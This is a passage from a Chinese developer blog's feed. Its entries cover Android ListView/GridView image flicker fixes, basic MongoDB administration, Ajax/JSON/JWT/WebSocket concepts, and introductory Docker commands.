class="line">if (convertView == null) &#123;</span><br><span class="line">convertView = inflater.inflate(R.layout.list_item, null);</span><br><span class="line">holder = new ViewHolder();</span><br><span class="line">……</span><br><span class="line">convertView.setTag(holder);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">holder = (ViewHolder)convertView.getTag();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">return convertView;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * ViewHolder</span><br><span class="line"> * </span><br><span class="line"> * @author trinea@trinea.cn 2013-08-01</span><br><span class="line"> */</span><br><span class="line">private static class ViewHolder &#123;</span><br><span class="line">ImageView appIcon;</span><br><span class="line">TextView  appName;</span><br><span class="line">TextView  appInfo;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>这里如果写的是convert()方法，则不需要写以上复用，因为父类中会做复用的事。</p><h2 id="第二步：-gridview-gridadapter-getview写法">第二步： GridView gridAdapter getVIew写法</h2><p>与上面写法类似；不过需要在用到图片的地方进行判断。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre>      </td>      <td class="code">        <pre><span class="line">@Override</span><br><span class="line">public View getView(int position, View convertView, ViewGroup parent) &#123;</span><br><span class="line">    ViewHolder holder;</span><br><span class="line">    if (convertView == null) &#123;</span><br><span class="line">    convertView = inflater.inflate(R.layout.list_item, null);</span><br><span class="line">    holder = new ViewHolder();</span><br><span class="line">    ……</span><br><span class="line">    convertView.setTag(holder);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    holder = (ViewHolder)convertView.getTag();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    /**</span><br><span class="line">    * 解决图片重复错乱闪烁的问题，例如</span><br><span class="line">    */</span><br><span class="line">    //建立一个唯一标示，一般为item的相应String对象</span><br><span class="line">    String file = mListResult.get(position).getFile();</span><br><span class="line">    ImageAware imageAware =new ImageViewAware(holder.iv,false);</span><br><span class="line">    //首先得到要设置的GridView</span><br><span class="line">    holder.iv.setTag(file);</span><br><span class="line">    //判断tag存在否</span><br><span class="line">    if(holder.iv.getTag()!=null&amp;&amp;holder.iv.getTag().equals(file))&#123;</span><br><span class="line">        imageLoader.displayImage(file,imageAware);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return convertView;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * ViewHolder</span><br><span class="line"> * </span><br><span class="line"> * @author linking123.github.io 2017-03-29</span><br><span class="line"> */</span><br><span class="line">private static class ViewHolder &#123;</span><br><span class="line">ImageView appIcon;</span><br><span class="line">TextView  appName;</span><br><span class="line">TextView  appInfo;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>一般情况下，走完以上两部可解决问题；解决不了的就要仔细检查一下，有没有像我一样的遗漏问题，小心啊，程序员们。</p><h1>参考</h1><ul>  <li><a href="http://www.trinea.cn/android/android-listview-display-error-image-when-scroll/" target="_blank" rel="noopener">Android ListView滑动过程中图片显示重复错位闪烁问题解决</a></li></ul><p>感谢作者们的无私奉献，如有侵权，立马删除。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/bc099606/">http://home.meng.uno/articles/bc099606/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      场景
为了实现一个订单下多个商品同时评价功能，列表分五种状态（非常满意，满意，一般，较差，不满意）展示，用一个listview，item中有一个GridView，GridView中放置最多五张图片；在listview上下滑动时会出现item中的图片重复、错乱、闪烁等问题。

出现错误
先讲我的错误。遇到问题后Google，参考了一些资料，都是提示要在外层listview的adapter上设置setTag(), 然后在内层GridView的adapter上整体和需要标记复用的imageView上setTag()。照此执行了，还是出错；后来在同事指点下，原来外层adapter中设置gridAdap
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="ListView" scheme="http://home.meng.uno/tags/ListView/"/>
    
      <category term="GridView" scheme="http://home.meng.uno/tags/GridView/"/>
    
  </entry>
  
  <entry>
    <title>MongDB的使用</title>
    <link href="http://home.meng.uno/articles/83c0afa5/"/>
    <id>http://home.meng.uno/articles/83c0afa5/</id>
    <published>2017-03-20T10:34:11.000Z</published>
    <updated>2020-12-02T01:43:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开启服务">开启服务</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongod --dbpath /data/db/ --port 27017 --fork --logpath --config --nohttpinterface</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>dbpath 数据库目录 (请先创建好，如果不创建，直接运行mongod会报错)</li>  <li>port 端口</li>  <li>fork 守护进程</li>  <li>logpath 日志目录</li>  <li>config 配置文件</li>  <li>nohttpinterface 关闭大于1000的管理接口</li>  <li>auth 开启服务器验证</li></ul><p>把配置放置在config文件里，增强复用性</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">port = 27017</span><br><span class="line">logpath = /Users/jan/mongdb.log</span><br><span class="line">auth = true</span><br><span class="line">fork = true</span><br><span class="line">dbpath = /Users/jan/data/db</span><br></pre>      </td>    </tr>  </table></figure><h2 id="关闭服务">关闭服务</h2><ul>  <li>在mongo环境中关闭</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">use admin</span><br><span class="line">db.shutdownServer()</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>使用 mongod 命令关闭</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongod  --shutdown  --dbpath /database/mongodb/data/</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>    <p>使用kill命令关闭</p>    <p>给服务器发送一个SIGINT,SIGTERM信号，即 “kill -2 PID,” 或者 “kill -15 PID“</p>  </li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ps aux | grep mongo</span><br><span class="line">jan             12899   0.4  0.5  3046076  41216   ??  S    11:44上午   0:00.22 mongod --config ./mongod.config</span><br><span class="line"></span><br><span class="line">kill -2 12899</span><br></pre>      </td>    </tr>  </table></figure><h2 id="非正常关闭mongodb-导致无法启动">非正常关闭mongodb，导致无法启动</h2><ol>  <li>    <p>删除 <code>/data/db/mongod.locks</code>文件</p>  </li>  <li>    <p>使用repair 选项修复mongodb<code>./mongod --repair</code></p>  </li>  <li>    <p>重启启动mongodb<code>./mongod</code></p>  </li></ol><h2 id="认证">认证</h2><p>在开启MongoDB 服务时不添加任何参数时，可以对数据库任意操作，而且可以远程访问数据库。如果启动的时候指定—auth参数，可以对数据库进行用户验证。</p><h3 id="添加帐号">添加帐号</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">use test</span><br><span class="line"></span><br><span class="line">db.addUser(&quot;username&quot;,&quot;password&quot;) //添加</span><br><span class="line">db.addUser(&quot;read_only&quot;,&quot;username&quot;,&quot;password&quot;) //添加只能读取权限帐号</span><br></pre>      </td>    </tr>  </table></figure><h3 id="更新密码">更新密码</h3><h3 id="本质">本质</h3><p>账户信息存在admin.system.users集合里，存储格式为：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">    &quot;user&quot;:&quot;xxxx&quot;,</span><br><span class="line">    &quot;readOnly&quot;:true,</span><br><span class="line">    &quot;pwd&quot;:password_hash</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>如果想查询数据库先添加一个授权用户</p><p>为数据库添加用户</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line">use admin </span><br><span class="line">db.addUser(&quot;root&quot;,&quot;1234&quot;)</span><br><span class="line">    &gt;&gt; output</span><br><span class="line">    &gt;&gt; &#123;</span><br><span class="line">            &quot;user&quot; : &quot;root&quot;,</span><br><span class="line">            &quot;readOnly&quot; : false,</span><br><span class="line">            &quot;pwd&quot; : &quot;fa0450e8c3e5fff6005de2f88559c3d9&quot;,</span><br><span class="line">            &quot;_id&quot; : ObjectId(&quot;53ca83234b763e5d3dbf15c2&quot;)</span><br><span class="line">        &#125;</span><br></pre>      </td>    </tr>  </table></figure><p>使用授权用户链接数据库</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongo admin -uroot -p1234 </span><br><span class="line">db.system.users.find()</span><br><span class="line">&gt;&gt; output </span><br><span class="line">&gt;&gt; &#123; </span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;53ca83234b763e5d3dbf15c2&quot;), </span><br><span class="line">        &quot;user&quot; : &quot;root&quot;, </span><br><span class="line">        &quot;readOnly&quot; : false,</span><br><span class="line">        &quot;pwd&quot; : &quot;fa0450e8c3e5fff6005de2f88559c3d9&quot; </span><br><span class="line">    &#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="链接服务">链接服务</h2><h3 id="本地链接">本地链接</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongo -uroot -p1234</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>u 认证用户名</li>  <li>p 认证密码</li></ul><h3 id="远程链接">远程链接</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongo -uroot -p1234 ip:port/dbname</span><br></pre>      </td>    </tr>  </table></figure><h3 id="导出-导入">导出 &amp; 导入</h3><h4 id="导出">导出</h4><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongoexport -d templates -c page -o templates.txt</span><br><span class="line"></span><br><span class="line">//远程导出</span><br><span class="line">mongoexport -d templates -c template -h 10.32.84.119:27017 -o  templates.txt</span><br></pre>      </td>    </tr>  </table></figure><p>更多help</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongoexport --help</span><br></pre>      </td>    </tr>  </table></figure><h4 id="导入">导入</h4><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongoimport -d templates -c template --file template.txt</span><br></pre>      </td>    </tr>  </table></figure><p>更多help</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongoimport --help</span><br></pre>      </td>    </tr>  </table></figure><h3 id="remote-db">remote db</h3><p>连接远程终端</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongo -u admin -p admin 192.168.0.197:27017/templates</span><br></pre>      </td>    </tr>  </table></figure><p>更多help</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mongo -h</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/83c0afa5/">http://home.meng.uno/articles/83c0afa5/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      开启服务
1


mongod --dbpath /data/db/ --port 27017 --fork --logpath --config --nohttpinterface


 * dbpath 数据库目录 (请先创建好，如果不创建，直接运行mongod会报错)
 * port 端口
 * fork 守护进程
 * logpath 日志目录
 * config 配置文件
 * nohttpinterface 关闭大于1000的管理接口
 * auth 开启服务器验证

把配置放置在config文件里，增强复用性

1
2
3
4
5


port = 27017
logpath =
    
    </summary>
    
      <category term="Database" scheme="http://home.meng.uno/categories/Database/"/>
    
    
      <category term="数据库" scheme="http://home.meng.uno/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="NoSQL" scheme="http://home.meng.uno/tags/NoSQL/"/>
    
      <category term="MongDB" scheme="http://home.meng.uno/tags/MongDB/"/>
    
  </entry>
  
  <entry>
    <title>前端与后端交互</title>
    <link href="http://home.meng.uno/articles/7a692555/"/>
    <id>http://home.meng.uno/articles/7a692555/</id>
    <published>2017-03-09T07:05:06.000Z</published>
    <updated>2020-12-02T01:40:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>在我们把后台服务化后，前端跨平台化之前，我们还需要了解前台和后台之间怎么通讯。从现有的一些技术上来看，Ajax 和 WebSocket 是比较受欢迎的。</p><h1>Ajax</h1><p>AJAX 即 “Asynchronous JavaScript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。这个功能在之前的很多年来一直被 Web 开发者所忽视，直到最近 Gmail、Google Suggest 和 Google Maps 的出现，才使人们开始意识到其重要性。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页如果需要更新内容，必须重载整个网页页面。</p><h2 id="ajax-请求">Ajax 请求</h2><p>说起 Ajax，我们就需要用 JavaScript 向服务器发送一个 HTTP 请求。这个过程要从 XMLHttpRequest 开始说起，它是一个 JavaScript 对象。它最初由微软设计，随后被 Mozilla、Apple 和 Google 采纳。如今，该对象已经被 W3C 组织标准化。</p><p>如下的所示的是一个 Ajax 请求的示例代码：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) &#123;</span><br><span class="line">        alert(xhr.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">'GET'</span>, <span class="string">'http://example.com'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre>      </td>    </tr>  </table></figure><p>我们只需要简单的创建一个请求对象实例，打开一个 URL，然后发送这个请求。当传输完毕后，结果的 HTTP 状态以及返回的响应内容也可以从请求对象中获取。</p><p>而这个返回的内容可以是多种格式，如 XML 和 JSON，但是从近年的趋势来看，XML 基本上已经很少看到了。这里我们以 JSON 为主，来简单地介绍一下返回数据的解析。</p><h1>JSON</h1><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它基于 ECMAScript 的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于 C 语言家族的习惯（包括 C、C++、C#、Java、JavaScript、Perl、Python等）。这些特性使 JSON 成为理想的数据交换语言。易于人阅读和编写，同时也易于机器解析和生成(一般用于提升网络传输速率)。</p><h2 id="xml-vs-json">XML VS JSON</h2><p>JSON 格式的数据具有以下的一些特点：</p><ul>  <li>容易阅读</li>  <li>解析速度更快</li>  <li>占用空间更少</li></ul><p>如下所示的是一个简单的对比过程：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">myJSON = &#123;&quot;age&quot; : 12, &quot;name&quot; : &quot;Danielle&quot;&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>如果我们要取出上面数值中的age，那么我们只需要这样做：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">anObject = JSON.parse(myJSON);</span><br><span class="line">anObject.age === 12 // True</span><br></pre>      </td>    </tr>  </table></figure><p>同样的，对于 XML 来说，我们有下面的格式:</p><figure class="highlight xml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>12<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Danielle<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><p>而如果我们要取出上面数据中的age的值，他将是这样的：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">myObject = parseThatXMLPlease();</span><br><span class="line">thePeople = myObject.getChildren(&quot;person&quot;);</span><br><span class="line">thePerson = thePeople[0];</span><br><span class="line">thePerson.getChildren(&quot;age&quot;)[0].value() == &quot;12&quot; // True</span><br></pre>      </td>    </tr>  </table></figure><p>对比一下，我们可以发现XML的数据不仅仅解析上比较麻烦，而且还繁琐。</p><h2 id="json-web-tokens">JSON WEB Tokens</h2><p>JSON Web Token (JWT) 是一种基于 token 的认证方案。</p><p>在人们大规模地开始 Web 应用的时候，我们在授权的时候遇到了一些问题，而这些问题不是 Cookie 所能解决的。Cookie 存在一些明显的问题：不能支持跨域、并且不是无状态的、不能使用CDN、与系统耦合等等。除了解决上面的问题，它还可以提高性能等等。基于 Session 的授权机制需要服务端来保存这个状态，而使用 JWT 则可以跳过这个问题，并且使我们设计出来的 API 满足 RESTful 规范。即，我们 API 的状态应该是没有状态的。因此人们提出了 JWT 来解决这一系列的问题。</p><p>通过 JWT 我们可以更方便地写出适用于前端应用的认证方案，如登陆、注册这些功能。当我们使用 JWT 来实现我们的注册、登陆功能时，我们在登陆的时候将向我们的服务器发送我们的用户名和密码，服务器验证后将生成对应的 Token。在下次我们进行页面操作的时候，如访问 /Dashboard 时，发出的 HTTP 请求的 Header 中会包含这个 Token。服务器在接收到请求后，将对这个 Token 进行验证并判断这个 Token 是否已经过期了。</p><h3 id="jwt-流程">JWT 流程</h3><p>需要注意的一点是：在使用 JWT 的时候也需要注意安全问题，在允许的情况下应该使用 HTTPS 协议。</p><h1>WebSocket</h1><p>在一些网站上为了实现推送技术，都采用了轮询的技术。即在特定的的时间间隔里，由浏览器对服务器发出 HTTP 请求，然后浏览器便可以从服务器获取最新的技术。如下图所示的是 Google Chrome 申请开发者账号时发出的对应的请求：</p><h2 id="chrome-ajax-轮询">Chrome Ajax 轮询</h2><p>Chrome 的前台正在不断地向后台查询 API 的结果。由于浏览器需要不断的向服务器发出请求，而 HTTP 的 Header 是非常长的，即使是一个很小的数据也会占用大量的带宽和服务器资源。为了解决这个问题，HTML5 推出了一种在单个 TCP 连接上进行全双工通讯的协议WebSocket。</p><p>WebSocket 可以让客户端和服务器之间存在持久的连接，而且双方都可以随时开始发送数据。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7a692555/">http://home.meng.uno/articles/7a692555/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      在我们把后台服务化后，前端跨平台化之前，我们还需要了解前台和后台之间怎么通讯。从现有的一些技术上来看，Ajax 和 WebSocket 是比较受欢迎的。

Ajax
AJAX 即 “Asynchronous JavaScript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。这个功能在之前的很多年来一直被 Web 开发者所忽视，直到最近 Gmail、Google Suggest 和 Google Maps 的出现，才使人们开始意识到其重要性。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="前端" scheme="http://home.meng.uno/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="后端" scheme="http://home.meng.uno/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="交互" scheme="http://home.meng.uno/tags/%E4%BA%A4%E4%BA%92/"/>
    
  </entry>
  
  <entry>
    <title>Docker的基本使用</title>
    <link href="http://home.meng.uno/articles/ca4a993b/"/>
    <id>http://home.meng.uno/articles/ca4a993b/</id>
    <published>2017-03-09T03:17:06.000Z</published>
    <updated>2020-12-02T01:45:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>本博文在观看网易蜂巢推出的<a href="http://study.163.com/course/courseMain.htm?courseId=1003188013" target="_blank" rel="noopener">玩转Docker镜像</a>视频教程之后总结而成。</p></blockquote><h1>基本使用</h1><p>谈到使用Docker，首先，我们必须要了解Dockerfile。（命名为<code>Dockerfile</code>，不要后缀）</p><h2 id="dockerfile的解读">Dockerfile的解读</h2><p>首先引入一个例子：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">FROM hub<span class="selector-class">.c</span>.<span class="number">163</span>.com/bingohuang/debian:<span class="number">163</span></span><br><span class="line">MAINTAINER bingohuang &lt;me@bingohuang.com&gt;</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y nginx</span><br><span class="line">COPY docker-mario /usr/share/nginx/www</span><br><span class="line">EXPOSE <span class="number">80</span></span><br><span class="line">ENTRYPOINT [<span class="string">"nginx"</span>, <span class="string">"-g"</span>, <span class="string">"daemon off;"</span>]</span><br></pre>      </td>    </tr>  </table></figure><p>逐句解释：</p><ul>  <li>关键字 <code>FROM</code>，选用包含163更新源的Debian镜像，版本7.9</li>  <li>关键字 <code>MAINTAINER</code>，添加作者信息和联系方式（有任何问题或反馈欢迎发邮件沟通）</li>  <li>关键字 <code>RUN</code>，运行命令，这里是更新程序列表并安装 Nginx 程序</li>  <li>关键字 <code>COPY</code>，将 <code>docker-mario</code> 源码拷贝到容器的 <code>/usr/share/nginx/www</code> 目录下（这是第三步安装好 Nginx 程序后自动生成的目录</li>  <li>关键字 <code>EXPOSE</code>，暴露端口，这里是 Nginx 的默认端口：<code>80</code></li>  <li>关键字 <code>ENTRYPOINT</code>，指定容器运行的默认指令（不会被用户指令覆盖）</li></ul><h2 id="构建镜像">构建镜像</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker build -t XXX:1.0 .</span><br></pre>      </td>    </tr>  </table></figure><h2 id="查看镜像">查看镜像</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker images</span><br></pre>      </td>    </tr>  </table></figure><p>输出样式：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">REPOSITORY                              TAG                 DIGEST              IMAGE ID            CREATED             SIZE</span><br></pre>      </td>    </tr>  </table></figure><h2 id="本地运行">本地运行</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker run --name docker-mario -d -p 1989:80 XXX:1.0</span><br></pre>      </td>    </tr>  </table></figure><p>查看运行的镜像：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker ps</span><br></pre>      </td>    </tr>  </table></figure><p>访问镜像：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">open http://127/0/0/1:1989/</span><br></pre>      </td>    </tr>  </table></figure><h2 id="上传镜像">上传镜像</h2><p>登录网易蜂巢：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker login -u &#123;你的网易云邮箱账号或手机号码&#125; -p &#123;你的网易云密码&#125; hub.c.163.com</span><br></pre>      </td>    </tr>  </table></figure><p>标记本地镜像：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker tag &#123;镜像名或ID&#125; hub.c.163.com/&#123;你的用户名&#125;/&#123;标签名&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>推送至网易云镜像仓库：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker push hub.c.163.com/&#123;你的用户名&#125;/&#123;标签名&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>附一张Docker操作流程图</strong></p><p><img src="http://www.meng.uno/images/docker/1.png" alt=""></p><h2 id="其他未列出的docker指令">其他未列出的Docker指令</h2><ul>  <li>帮助</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker -h</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>获取镜像</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker pull NAME[:TAG]</span><br><span class="line">sudo docker pull centos:latest</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>启动Container盒子</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">sudo docker run -t -i contos /bin/bash</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>查看镜像列表，列出本地的所有images</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker images [OPTIONS] [NAME]</span><br><span class="line">sudo docker images centos</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>查看容器列表，可看到我们创建过的所有container</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker ps [OPTIONS]</span><br><span class="line">sudo docker ps -a</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>删除镜像，从本地删除一个已经下载的镜像</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker rmi IMAGE [IMAGE...]</span><br><span class="line">sudo docker rmi centos:latest</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>移除一个或多个容器实例</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>移除所有微运行的容器</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker rm sudo docker ps -aq</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>停止一个正在运行的容器</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker kill [OPTIONS] CONTAINER [CONTAINNER...]</span><br><span class="line">sudo docker kill 026e</span><br></pre>      </td>    </tr>  